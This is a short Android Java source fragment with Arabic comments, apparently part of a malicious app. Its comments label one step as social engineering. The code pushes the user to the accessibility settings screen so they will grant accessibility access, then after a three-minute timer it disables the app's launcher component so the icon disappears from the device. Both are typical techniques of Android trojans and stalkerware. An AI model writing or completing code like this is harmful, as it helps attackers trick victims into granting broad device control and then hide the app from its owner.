public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 1. اطلب من المستخدم تفعيل Accessibility (الهندسة الاجتماعية)
        if (!isAccessibilityServiceEnabled()) {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }

        // 2. مؤقت الـ 3 دقائق لإخفاء التطبيق
        new Handler().postDelayed(() -> {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, 
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                PackageManager.DONT_KILL_APP);
        }, 180000); // 3 دقائق
    }

    private boolean isAccessibilityServiceEnabled() {
        // كود فحص إذا كانت الخدمة مفعلة
        return false; // للتبسيط
    }
}
